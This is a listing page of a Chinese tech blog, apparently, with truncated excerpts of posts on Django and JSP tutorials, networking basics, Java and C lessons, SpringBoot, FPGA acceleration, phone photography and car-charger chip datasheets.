依然以我司举例，具体的可观察性体现在 KAE 上就是平台的可视化，包括项目的开发进程、BUGFIX 个数、测试结果、用户反馈、项目预期等数据的可视化。
从系统的角度来看，可观察性意味着通过观察复杂系统的外部行为来了解复杂系统的内部功能。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8f1ecbceefd12dd704f604b755e8f240/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63d5fa5c772261b5e4e7559f09e10068/" rel="bookmark">
			使用cookie进行登录操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要求：1、登录的账号是首次登录则显示成功登录； 2、登录的账号非首次登录则显示最后一次登录的时间。
由于技术有限，目前所作的是固定账户名相同的，并非采用数据库进行对比。
首先需要设置登录界面，login.jsp文件：
&lt;%-- Created by IntelliJ IDEA. User: TY Date: 2022/8/17 Time: 13:54 To change this template use File | Settings | File Templates. --%&gt; &lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="/homework" method="post" &gt;&lt;br&gt; 用户名&lt;input id="username" name="username" type="text" &gt;&lt;br&gt; 密码 &lt;input name="password" type="password"&gt;&lt;br&gt; &lt;button type="submit"&gt;提交&lt;/button&gt; &lt;/form&gt; &lt;%--&lt;span style="color:red"&gt;&lt;/span&gt;--%&gt; &lt;span style="width: auto"&gt;${sessionScope.msg}&lt;/span&gt; &lt;/body&gt; &lt;/html&gt; 然后可以设置一个登陆成功界面进行跳转，success.jsp：
&lt;%-- Created by IntelliJ IDEA. User: TY Date: 2022/8/17 Time: 14:38 To change this template use File | Settings | File Templates.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63d5fa5c772261b5e4e7559f09e10068/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02a4aea2708fd3ace7800e6baa13160e/" rel="bookmark">
			Django--案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		案例1：用户管理
1. 展示用户列表 url函数 获取所有用户信息HTML渲染 将数据库获取的对象当做参数传递给前端HTML：
注意字典的键是双引号。
补充：时间在模板中如何使用字符串
2.添加用户 url函数 通过GET方式，看到页面，输入内容。通过POST方式，提交 -&gt; 写入到数据库。
可以在列表的html中添加一个a标签链接到add 中，因为是在同一个网址下，即![在这里插入图片描述](https://img-blog.csdnimg.cn/7b277d2c3e314577bd8156725ff0e295.png 3.删除用户 url函数 同样先添加 删除的 URL 和函数 ，
开始时可以直接URL后面添加 ？uid=xx 来指定删除对应id 的数据.
由于不能让用户去输入对应id的URL来实现删除，所示设置a标签进行跳转删除
这样就通过前面的for循环在每一列后面添加了删除的a标签来跳转到删除的URL 而id即使用当前的obj.id来实现指定id的删除
结果如下：
由于在当前的同样的网址下操作，所以Href后面的网址 http://127.0.0.1:8000 同样可以省去
再设置删除后面的跳转的页面
#案例2
设计数据库表
max_digits参数表示数字长度，而decimal_places表示小数点后面的长度
通过ForeignKey来设置外键，参数中的to 表示与哪张表进行关联，to_fields与表中哪一列关联,
on_delete=models.CASCADE 表示级联删除，当外键中对应的部门删除后，对应的主键也会被删除;
on_delete=models.SET_NULL 表示当外键被删除后，主键内容不是被删除，而是被置空;
可以在Django中通过元组来为其做约束，
这里约束之后选择性别的时候只能是1，或2。
设计数据库
修改配置文件，连接MySQL
DATABASES = {
‘default’: {
‘ENGINE’: ‘django.db.backends.mysql’,
‘NAME’:‘test1’,
‘USER’:‘root’,
‘PASSWORD’:‘root’,
‘HOST’:‘127.0.0.1’,
‘PORT’:3306,
}
}
通过Django命令生成 数据库表
python manage.py makemigrations
python manage.py migrate
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02a4aea2708fd3ace7800e6baa13160e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0467c7fcb7e10d7e84c0480c4b49450c/" rel="bookmark">
			认识数据链路层
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #认识以太网 "以太网" 不是一种具体的网络，而是一种技术标准；既包含了数据链路层的内容，也包含了 一些物理层的内容。例如：规定了网络拓扑结构，访问控制方式，传输速率等；例如以太网中的网线必须使用双绞线；传输速率有10M，100M，1000M等； 以太网是当前应用最广泛的局域网技术；和以太网并列的还有令牌环网，无线LAN等；
以太网帧格式 可以看见，在数据链路层传输的数据帧是由IP数据报封装而成的，其中源地址和目的地址是指网卡的硬件地址（也叫MAC地址），长度是48位，是在网卡出厂时固 化的； 帧协议类型字段有三种值，分别对应IP、ARP、RARP； 帧末尾是CRC校验码。
#认识MTU MTU相当于发快递时对包裹尺寸的限制。这个限制是不同的数据链路对应的物理层，产生的限制。
以太网帧中的数据长度规定最小46字节，最大1500字节，ARP数据包的长度不够46字节， 要在后面补填充位；
最大值1500称为以太网的最大传输单元（MTU），不同的网络类型有不同的MTU；
如果一个数据包从以太网路由到拨号链路上，数据包长度大于拨号链路的MTU了，则需要对 数据包进行分片（fragmentation）；
不同的数据链路层标准的MTU是不同的；
MTU对IP协议的影响 由于数据链路层MTU的限制，对于较大的IP数据包要进行分包。
将较大的IP包分成多个小包，并给每个小包打上标签； 每个小包IP协议头的 16位标识（id） 都是相同的； 每个小包的IP协议头的3位标志字段中，第2位置为0，表示允许分片，第3位来表示结束标记 （当前是否是最后一个小包，是的话置为1，否则置为0）； 到达对端时再将这些小包，会按顺序重组，拼装到一起返回给传输层；一旦这些小包中任意一个小包丢失，接收端的重组就会失败。但是IP层不会负责重新传输数据；
MTU对UDP协议的影响 一旦UDP携带的数据超过1472（1500 - 20（IP首部） - 8（UDP首部）），那么就会在网络 层分成多个IP数据报。 这多个IP数据报有任意一个丢失，都会引起接收端网络层重组失败。那么这就意味着，如果 UDP数据报在网络层被分片，整个数据被丢失的概率就大大增加了。 MTU对于TCP协议的影响 TCP的一个数据报也不能无限大，还是受制于MTU。TCP的单个数据报的最大消息长度，称 为MSS（Max Segment Size）；
TCP在建立连接的过程中，通信双方会进行MSS协商。
最理想的情况下，MSS的值正好是在IP不会被分片处理的最大长度（这个长度仍然是受制于 数据链路层的MTU）。
双方在发送SYN的时候会在TCP头部写入自己能支持的MSS值。
然后双方得知对方的MSS值之后，选择较小的作为最终MSS。
MSS的值就是在TCP首部的40字节变长选项中（kind=2）；
MSS和MTU的关系
#ARP协议 虽然我们在这里介绍ARP协议，但是需要强调，ARP不是一个单纯的数据链路层的协议，而是一个介于 数据链路层和网络层之间的协议； ARP协议的作用 ARP协议建立了主机 IP地址 和 MAC地址 的映射关系。 （1）主机和路由器中都保存了一张ARP缓存表：通过IP地址可以找到对应的MAC地址。
（2）根据下一跳设备的IP地址，在ARP缓存表中能找到对应的MAC地址，则可以设置目的MAC并发送数据报。
（3）如果找不到，则发送ARP广播数据报：目的MAC为广播地址，询问下一跳设备的MAC地址。 这个过程类似于QQ群喊话：张三（下一跳设备IP地址），我要给你发快递（发送数据报），请告诉 我你的收货地址（MAC地址）。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbd03e5fcbb8e314e778a779e7457f3f/" rel="bookmark">
			Ubuntu 20.04下vscode的安装（学习总结Day 3）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.vscode的安装 今天在安装vscode时发现了一个宝藏网站，下载安装包的过程真的超级迅速，链接我附在下面啦~
https://blog.csdn.net/lllusionary/article/details/121423461
我来稍微总结一下下：
1.官网下载，要选择.deb格式
2.右击下载项目，复制下载链接，粘贴在新标签页网址部分
将链接中的az764295.vo.msecnd.net替换为vscode.cdn.azure.cn，然后访问，就可以下载vscode安装包了，而且只需1分钟！
3.右击文件选择在终端打开，输入sudo mv （此处按Tab键获取文件名） /usr/share，回车，输入密码（密码是隐形的，输完直接回车，不用担心看不见哟~），回车后输入cd /usr/share，再输入sudo dpkg -i （此处复制第一行代码中mv与/usr/share之间的部分），回车即可完成安装。
4.大功告成，在下面可以查看vscode的存在啦~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17b963c16af83bf1efa3fb4eb69af2b5/" rel="bookmark">
			WD5032车充3.1A快充IC
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WD5032车充3.1A快充芯片
车充34V/3.1A快速充电芯片
车充快充充电芯片
车充专用芯片
车充芯片
快速充电芯片
3.1A车充快充芯片，
支持快快速充电车充芯片
集成的USB专用充电协议符合最流行的快
速充电协议QC2.0./3.0、 FCP、SCP和AFC等。
它还支持Apple、iPhone、BC1.2或YD/T1591兼容设备。自动检测功能可自动识别连接
WD5032宽电输入8.5V至32V高达3.1A的连续负载
8引脚标准小外形封装[SOP-8]
WD5032支持高通快充2.0/3. 0 /支持FCP/AFC/支持USB DCP在D+/ D-. 上施加2.7V
符合BC1.2、YD/T 1591-2009
WD5032自动检测功能可自动识别连接到USB端口的手持设备，并自动随快充协商
调整输出电压。
3.1A快充车充芯片应用
●墙壁适配器，智能手机
●车载充电器
●平板电脑、.上网本
●分布式电力系统
WD5032绝对最大额定值(at TA= 25°C)
Wd5032 supports Qualcomm fast charging 2.0 / 3.0 / FCP / AFC / USB DCP in D + / D - Apply 2.7V to
Comply with bc1.2 and YD / T 1591-2009
Wd5032 automatic detection function can automatically identify handheld devices connected to USB ports and automatically negotiate with fast charging
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/17b963c16af83bf1efa3fb4eb69af2b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9edbe023318f7937020b83b54bb40ec/" rel="bookmark">
			Java学习----数据结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今日学习内容总结如下： 程序=算法（解决问题的步骤）+数据结构（合理的持有数据）
如何衡量算法的优劣？
1、计算时间 long start=System.currentTimeInMills();
处理步骤；
long end=System.currentTimeInMills();
System.out.println("该算法用时"+(end-start)+"ms");
2、时间复杂度 是一个用于度量一个算法的运算时间的一个描述，本质是一个函数，根据这个函数能在不用具体的测试数据来测试的情况下，粗略地估计算法的执行效率
查找一个算法中执行次数最多的部分和算法规模的相互关系--函数
常用大O来表述，这个函数描述了算法执行所要时间的增长速度
常量阶 O(1)对数阶 O(logn)线性阶 O(n)线性对数阶 O(nlogn)n方阶 O(nⁿ)指数阶 O(2ⁿ)阶乘阶 O(n!) package com.list0; import java.util.Arrays; public class Test1 { public static void main(String[] args) { int[] arr = new int[] { 1, 6, 2, 4, 3, 7, 9, 8 }; for (int i = 1; i &lt; arr.length; i++) { // 7 for (int k = 0; k &lt; arr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9edbe023318f7937020b83b54bb40ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b24e06ed0edd153518adb63491ec377c/" rel="bookmark">
			[C语言学习]----函数递归（超详细！！！）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇介绍的是C语言函数递归的详细知识
程序的艺术来源于生活
目录
7. 函数递归
7.1递归是什么
7.2 递归的两个必要条件
7.2.1练习1（详细讲解）
7.2.2练习2（详细讲解）
7.3 递归与迭代
7.3.1练习3（详细讲解）
7.3.2 练习4（详细讲解）
7.4练习3,4中出现的问题
7. 函数递归 7.1递归是什么 程序调用自身的编程技巧称为递归
（函数自己调用自己）
递归做为一种算法在程序设计语言中广泛应用。 一个过程或函数在其定义或说明中有直接或间接调用自身的一种方法，它通常把一个大型复杂的问题层层转化为一个与原问题相似的规模较小的问题来求解
递归策略
只需少量的程序就可描述出解题过程所需要的多次重复计算，大大地减少了程序的代码量。
递归的主要思想在于：把大事化小
例（史上最简单的递归）：
#include&lt;stdio.h&gt; int main() { printf("Hello World\n"); main(); } 先一直打印 Hello World，最终程序挂掉
7.2 递归的两个必要条件 存在限制条件，当满足这个限制条件的时候，递归便不再继续。每次递归调用之后越来越接近这个限制条件 7.2.1练习1（详细讲解） 接受一个整型值（无符号），按照顺序打印它的每一位。
例如：
输入：1234，输出 1 2 3 4
我们的第一想法是先让
1234%10 = 4 1234/10=123 123%10=3 123/10=12 12%10=2 12/10=1 1%10=1 1/10=0 这样能够得到数字的每一位，然后我们再打印出来
#include&lt;stdio.h&gt; int main() { unsigned int num = 0; scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b24e06ed0edd153518adb63491ec377c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8820db705a2a135b08e9e166675049c0/" rel="bookmark">
			Gitlab内存占用过高的解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、背景：最近使用Jenkins发布项目的时候，出现卡死的情况。然后，就去服务器跟踪具体情况，经过分析，发现CPU占用率在90%-100%之间波动。然后通过Linux命令：top -c查到与Gitlab有关的Git进程CPU占用率过高。
二、解决方法：
根据网上资料查找，修改Gitlab配置文件发现不起作用。于是就找了另一种解决方法：强制睡眠进程，具体做法如下：
1、通过命令：top -c //查询占用CPU过高的进程ID
2、通过命令：kill -s STOP 进程号 //休眠该进程，释放CPU空间
具体如下图所示：
以上做法仅供参考，但是总归觉得治标不治本。如果对于这个问题，您有更好的分析和看法，欢迎评论交流学习！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1cc55034b4c6f7b934c1d28df513a10/" rel="bookmark">
			手机也可以摄影（2）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 三分照，七分修图 一、手机修图软件Snapped 后期修图要点：1.光影处理 2.色彩处理 3.质感处理 4.特效、修饰处理。直方图结合曲线使用： 三原色：红、绿、蓝 实操代练原图修改后 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb83e8fded7e640a13ba2828af5ec9bb/" rel="bookmark">
			SpringBoot基础篇学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里写自定义目录标题 1. 入门案例解析1.1 parent-仅定义未使用1.2 starter1.3 引导类1.4 内嵌tomcat-辅助功能 2. Rest风格2.1 Rest简介2.2 RESTful入门案例2.3 REST快速开发2.4 接收参数的三种方式 3. springBoot基础配置3.1 属性配置3.2 配置文件分类3.3 yaml文件3.4 yaml数据读取3.4.1 **读取单一数据**3.4.2 **读取全部数据**3.4.3 **读取对象数据**3.4.4 yaml文件中的数据引用 4. 整合第三方技术4.1 整合JUnit4.2 整合MyBatis4.3 整合MyBatis-Plus4.4 整合Druid 5. SSMP整合综合案例0.模块创建1.实体类开发2.数据层开发——基础CRUD3.数据层开发——分页功能制作4.数据层开发——条件查询功能制作5.业务层开发5.1 业务层快速开发 6.表现层开发7.表现层消息一致性处理8.前后端联通性测试9.页面基础功能开发F-1.列表功能（非分页版）F-2.添加功能F-3.删除功能F-4.修改功能 10.业务消息一致性处理11.页面功能开发F-5.分页功能F-6.删除功能维护F-7.条件查询功能 黑马程序员SpringBoot2全套视频教程，springboot零基础到项目实战
使用RestController代替Controller+ResponseBody
在Dao的实现类上加@Repository，@Repository就是写在数据层上的。
@Service将servive的实现类定义为 业务层对应的bean
表现层Contrller中， 带参数的，用异步提交发送的话，参数通过请求体传json数据过来， 用 请求体参数@RequestBody；删除和传单个 使用的是路径变量来传参，@PathVariable
业务层接口关注的是 业务名称
数据层接口关注的是 与数据库相关的操作
1. 入门案例解析 spring程序缺点：
依赖设置繁琐配置繁琐 SpringBoot程序优点：
起步依赖（简化依赖配置）自动配置（简化常用工程相关配置）辅助功能（内置服务器，…） 1.1 parent-仅定义未使用 定义一系列坐标，属性和依赖管理
子工程继承了parent， parent又继承了dependencies， dependencies定义了几百了版本信息，以及对应的坐标引用信息。方便我们的配置
开发SpringBoot程序要继承spring-boot-starter-parentspring-boot-starter-parent中定义了若干个依赖管理继承parent模块可以避免多个依赖使用相同技术时出现依赖版本冲突继承parent的形式也可以采用引入依赖的形式实现效果 1.2 starter 下面的依赖在使用
对应的start其实就是包含了若干个坐标定义的pom管理文件，一个start包含了若干个依赖管理信息。
项目中的pom.xml定义了使用SpringMVC技术，但是并没有写SpringMVC的坐标，而是添加了一个名字中包含starter的依赖
在spring-boot-starter-web中又定义了若干个具体依赖的坐标
总结
开发SpringBoot程序需要导入坐标时通常导入对应的starter每个不同的starter根据功能不同，通常包含多个依赖坐标使用starter可以实现快速配置的效果，达到简化配置的目的 starter与parent的区别
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb83e8fded7e640a13ba2828af5ec9bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77689d15e16f8554ee7e43a4a8e592f2/" rel="bookmark">
			手机也可以摄影
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、曝光三要素：快门速度，光圈，感光度 光圈：光圈越大，进入光就越多，画面越亮（通俗类比轮胎） 感光度ISO:(International Standards Organization)国际标准协定：感光器对光的敏感程度。低感光度：ISO 50以下；中感光度：ISO 100-200；高感光度：ISO 400以上。（感光度越高拍的照片越亮；反之，暗。同时感光度过高，照片也相对模糊。） 二、光和影 摄影是一门光影的艺术。 1.光的六大基本要素 光度：光源发光强度和关线在物体表面的照度的总称（光的强度，物体吸收光的程度）eg:镜子的光度比墙面强。补光设备：手电筒。。。光位：光线的方向与角度。顺光，侧顺光，侧光，侧逆光，逆光，顶光，底光。 注：
顺光：光线来自被摄体的正面，正面光照射使得物体显得明亮，但立体感较差，缺乏明暗变化。
侧光：被摄体呈阴阳效果，人像中富于戏剧性效果的主光位置。明暗对比强烈。
逆光：背光，来自被摄体的正后方，产生生动的轮廓线条，是主体与背景分离，产生立体感、 空间感。
顶光：光线来自被摄体的正上方，会产生浓重阴影，忌拍人像。（所以中午不适合顶着大太阳出去拍照）
底光：人像拍摄，多用于恐怖电影。
光质：拍摄所用光线的软硬性质。分为软质光和硬质光。注：室内如何软化光：借助外物（将强光源打到物体上反光或者遮挡）光型：各种光在拍摄时的作用。 （1）主光：又称“塑性光”指用以显示景物，表现质感、塑造形像的主要照明光。
（2）辅光：又称“补光”，用以提高由主光产生的阴影部亮度，揭示阴影部细节，减小影像反差。
（3）修饰光：又称“装饰光”，对被摄体局部添加的强化塑性光线，如：发光，眼神光，工艺首饰的耀斑光。
（4）轮廓光：指构划被摄体轮廓的光线，逆光、侧逆光通常用作轮廓光。
（5）背景光：灯光位于被拍摄者的后方朝向背景照射的光线，用以突出主体或美化画面。
光比：照明环境下被摄体暗面与亮面的受光比例（明暗比例）。硬调：高反差；软调：低反差。光色：光的颜色，色温。 2.光影巧妙应用 利用影子制造对称图形。 制造剪影效果 gou'tu利用光影讲故事 虚实结合 制作创意图像 利用阴影使画面对称利用阴影改变主体外观，增加纹理效果。 三、构图 手机软件：轻颜相机、魔漫相机、Snapped
1.构图与二次构图 构图：画面中元素排布二次构图：裁剪，旋转反转。 二次构图后： 剔除人之后： 2.构图常用模板 中央构图：主体物放中央。三分构图法、黄金分割构图、九宫格构图（线条交叉处为力量点，拍摄时尽可能将主体物安排在力量点的位置。） 实例分析：力量点+视线延伸 对角线构图法（带来一种不稳定，动感） 对称构图（稳定，结实的感觉）
三角形构图 （稳固） 使用1：1正方形画图S线构图：延长变化的特点，常用于河流，溪水，曲径，轨迹，小路等。 框架式构图:框架元素（窗户，门框，洞口） 留白构图：高级感，利用留白延伸画面的空间感。 散点构图（不常用）放射性构图：以拍摄主题为核心，向四周扩散的构图方式。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a72951eb2f05b87281eb601de72af4c/" rel="bookmark">
			从FPGA到camera ISP漫谈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		从FPGA到camera ISP漫谈
参考文献链接
https://mp.weixin.qq.com/s/RBzN1Ii3_AH3omljmAByNA
https://mp.weixin.qq.com/s/lxcJ_QFILTW3_PgP2oOkug
FPGA技术
FPGA技术
人工智能芯片与自动驾驶 2022-03-08 06:30
FPGA可用于处理多元计算密集型任务，依托流水线并行结构体系，FPGA相对GPU、CPU在计算结果返回时延方面具备技术优势。
计算密集型任务：矩阵运算、机器视觉、图像处理、搜索引擎排序、非对称加密等类型的运算属于计算密集型任务。该类运算任务可由CPU卸载至FPGA执行。
FPGA执行计算密集型任务性能表现：
• 计算性能相对CPU：如Stratix系列FPGA进行整数乘法运算，其性能与20核CPU相当，进行浮点乘法运算，其性能与8核CPU相当。
• 计算性能相对GPU：FPGA进行整数乘法、浮点乘法运算，性能相对GPU存在数量级差距，可通过配置乘法器、浮点运算部件接近GPU计算性能。
FPGA执行计算密集型任务核心优势：搜索引擎排序、图像处理等任务对结果返回时限要求较为严格，需降低计算步骤时延。传统GPU加速方案下数据包规模较大，时延可达毫秒级别。FPGA加速方案下，PCIe时延可降至微秒级别。远期技术推动下，CPU与FPGA数据传输时延可降至100纳秒以下。
FPGA可针对数据包步骤数量搭建同等数量流水线（流水线并行结构），数据包经多个流水线处理后可即时输出。GPU数据并行模式依托不同数据单元处理不同数据包，数据单元需一致输入、输出。针对流式计算任务，FPGA流水线并行结构在延迟方面具备天然优势。
FPGA用于处理通信密集型任务不受网卡限制，在数据包吞吐量、时延方面表现优于CPU方案，时延稳定性较强。
通信密集型任务：对称加密、防火墙、网络虚拟化等运算属于通信密集型计算任务，通信密集数据处理相对计算密集数据处理复杂度较低，易受通信硬件设备限制。
FPGA执行通信密集型任务优势：
① 吞吐量优势：CPU方案处理通信密集任务需通过网卡接收数据，易受网卡性能限制（线速处理64字节数据包网卡有限，CPU及主板PCIe网卡插槽数量有限）。GPU方案（高计算性能）处理通信密集任务数据包缺乏网口，需依靠网卡收集数据包，数据吞吐量受CPU及网卡限制，时延较长。FPGA可接入40Gbps、100Gbps网线，并以线速处理各类数据包，可降低网卡、交换机配置成本。
② 时延优势：CPU方案通过网卡收集数据包，并将计算结果发送至网卡。受网卡性能限制，DPDK数据包处理框架下，CPU处理通信密集任务时延近5微秒，且CPU时延稳定性较弱，高负载情况下时延或超过几十微秒，造成任务调度不确定性。FPGA无需指令，可保证稳定、极低时延，FPGA协同CPU异构模式可拓展FPGA方案在复杂端设备的应用。
FPGA部署包括集群式、分布式等，逐渐从中心化过渡至分布式，不同部署方式下，服务器沟通效率、故障传导效应表现各异。
FPGA嵌入功耗负担：FPGA嵌入对服务器整体功耗影响较小，以Catapult联手微软开展的FPGA加速机器翻译项目为例，加速模块整体总计算能力达到103Tops/W，与10万块GPU计算能力相当。相对而言，嵌入单块FPGA导致服务器整体功耗增加约30W。
FPGA部署方式特点及限制：
① 集群部署特点及限制：FPGA芯片构成专用集群，形成FPGA加速卡构成的超级计算器（如Virtex系列早期实验板于同一硅片部署6块FPGA，单位服务器搭载4块实验板）。
• 专用集群模式无法在不同机器FPGA之间实现通信；
• 数据中心其他机器需集中发送任务至FPGA集群，易造成网络延迟；
• 单点故障导致数据中心整体加速能力受限
② 网线连接分布部署：为保证数据中心服务器同构性（ASIC解决方案亦无法满足），该部署方案于不同服务器嵌入FPGA，并通过专用网络连接，可解决单点故障传导、网络延迟等问题。
• 类同于集群部署模式，该模式不支持不同机器FPGA间通信；
• 搭载FPGA芯片的服务器具备高度定制化特点，运维成本较高
③ 共享服务器网络部署：该部署模式下，FPGA置于网卡、交换机间，可大幅提高加速网络功能并实现存储虚拟化。FPGA针对每台虚拟机设置虚拟网卡，虚拟交换机数据平面功能移动至FPGA内，无需CPU或物理网卡参与网络数据包收发过程。该方案显著提升虚拟机网络性能（25Gbps），同时可降低数据传输网络延迟（10倍）。
分享服务器网络部署模式下，FPGA加速器有助于降低数据传输时延，维护数据中心时延稳定，显著提升虚拟机网络性能。
分享服务器网络部署模式下FPGA加速Bing搜索排序：Bing搜索排序于该模式下采用10Gbps专用网线通信，每组网络由8个FPGA组成。其中，部分负责提取信号特征，部分负责计算特征表达式，部分负责计算文档得分，最终形成机器人即服务（RaaS）平台。FPGA加速方案下，Bing搜索时延大幅降低，延迟稳定性呈现正态分布。该部署模式下，远程FPGA通信延迟相对搜索延迟可忽略。
Azure服务器部署FPGA模式：Azure针对网络及存储虚拟化成本较高等问题采取FPGA分享服务器网络部署模式。随网络计算速度达到40Gbps，网络及存储虚拟化CPU成本激增（单位CPU核仅可处理100Mbps吞吐量）。通过在网卡及交换机间部署FPGA，网络连接扩展至整个数据中心。通过轻量级传输层，同一服务器机架时延可控制在3微秒内，触达同数据中心全部FPGA机架时延可控制在20微秒内。
依托高带宽、低时延优势，FPGA可组成网络交换层与服务器软件之间的数据中心加速层，并随分布式加速器规模扩大实现性能超线性提升。
数据中心加速层：FPGA嵌入数据中心加速平面，位于网络交换层（支架层、第一层、第二层）及传统服务器软件（CPU层面运行软件）之间。
加速层优势：
• FPGA加速层负责为每台服务器（提供云服务）提供网络加速、存储虚拟化加速支撑，加速层剩余资源可用于深度神经网络（DNN）等计算任务。
• 随分布式网络模式下FPGA加速器规模扩大，虚拟网络性能提升呈现超线性特征。
加速层性能提升原理：使用单块FPGA时，单片硅片内存不足以支撑全模型计算任务，需持续访问DRAM以获取权重，受制于DRAM性能。加速层通过数量众多的FPGA支撑虚拟网络模型单层或单层部分计算任务。该模式下，硅片内存完整加载模型权重，可突破DRAM性能瓶颈，FPGA计算性能得到充分发挥。加速层需避免计算任务过度拆分而导致计算、通信失衡。
嵌入式eFPGA技术在性能、成本、功耗、盈利能力等方面优于传统FPGA嵌入方案，可针对不同应用场景、不同细分市场需求提供灵活解决方案.
eFPGA技术驱动因素：设计复杂度提升伴随设备成本下降的经济趋势促发市场对eFPGA技术需求。
器件设计复杂度提升：SoC设计实现过程相关软件工具趋于复杂（如Imagination Technologies为满足客户完整开发解决方案需求而提供PowerVR图形界面、Eclipse整合开发环境），工程耗时增加（编译时间、综合时间、映射时间，FPGA规模越大，编译时间越长）、制模成本提高(FPGA芯片成本为同规格ASIC芯片成本100倍）。
设备单位功能成本持续下降：20世纪末期，FPGA平均售价较高（超1,000元），传统模式下，FPGA与ASIC集成设计导致ASIC芯片管芯面积、尺寸增大，复杂度提升，早期混合设备成本较高。21世纪，相对批量生产的混合设备，FPGA更多应用于原型设计、预生产设计，成本相对传统集成持续下降（最低约100元），应用灵活。eFPGA技术优势：
更优质：eFPGA IP核及其他功能模块的SoC设计相对传统FPGA嵌入ASIC解决方案，在功耗、性能、体积、成本等方面表现更优。
更方便：下游应用市场需求更迭速度快，eFPGA可重新编程特性有助于设计工程师更新SoC，产品可更长久占有市场，利润、收入、盈利能力同时大幅提升。eFPGA方案下SoC可实现高效运行，一方面迅速更新升级以支持新接口标准，另一方面可快速接入新功能以应对细分化市场需求。
更节能：SoC设计嵌入eFPGA技术可在提高总性能的同时降低总功耗。利用eFPGA技术可重新编程特性，工程师可基于硬件，针对特定问题对解决方案进行重新配置，进而提高设计性能、降低功耗。
FPGA技术无需依靠指令、无需共享内存，在云计算网络互连系统中提供低延迟流式通信功能，可广泛满足虚拟机之间、进程之间加速需求.
FPGA云计算任务执行流程：主流数据中心以FPGA为计算密集型任务加速卡，赛灵思及阿尔特拉推出基于OpenCL的高层次编程模型，模型依托CPU触达DRAM，向FPGA传输任务，通知执行，FPGA完成计算并将执行结果传输至DRAM，最终传输至CPU。
FPGA云计算性能升级空间：受限于工程实现能力，当前数据中心FPGA与CPU之间通信多以DRAM为中介，通过烧写DRAM、启动kernel、读取DRAM的流程完成通信（FPGADRAM相对CPU DRAM数据传输速度较慢），时延近2毫秒（OpenCL、多个kernel间共享内存）。CPU与FPGA间通信时延存在升级空间，可借助PCIe DMA实现高效直接通信，时延最低可降至1微秒。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a72951eb2f05b87281eb601de72af4c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d5042d5573faf5a3e6498a959b8cd96/" rel="bookmark">
			快充车充3.1A同步降压芯片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WD5034快充芯片，同步降压芯片，DC-DC同步降压芯片,宽VIN输入8.5V-32V3.1A同步整流dc-dc降压，输出电压可调范围1V至25V快充充电芯片
WD5034能够提供高达3.1A的连续电流具有出色的线路和负载调节能力，不仅外围简洁，效率高达93%-94%.
WD5034利用恒定频率的转换器平均电流模式控制架构同步降压DC / DC，带有短路功能和热保护电路增加系统可靠性。
不仅外围简洁，效率高达93%-94%.是低成本3A电流车充方案的不二之选。
单片同步降压DC / DC利用恒定频率的转换器平均电流模式控制架构。能够提供高达3.1A的连续电流具有出色的线路和负载调节能力。
特征
●宽VIN范围:8.5V至32V
●3.1A连续输出电流
●效率高达93%
●CC/CV模式控 制
●100%最大占空比
●默认5.1V固定输出电压
●+/-2%输出电压精度
●内环补偿
●集成45/21 mQ高/低侧RDS (ON)
●轻负载下的突发模式操作USB专用充电
协议
CC / CV模式控制
100％大占空比
内置可调线路补偿
可调输出电压?8?5+/- 1.5％输出电压精度
±5％电流限制精度。集成70mΩ高端开关
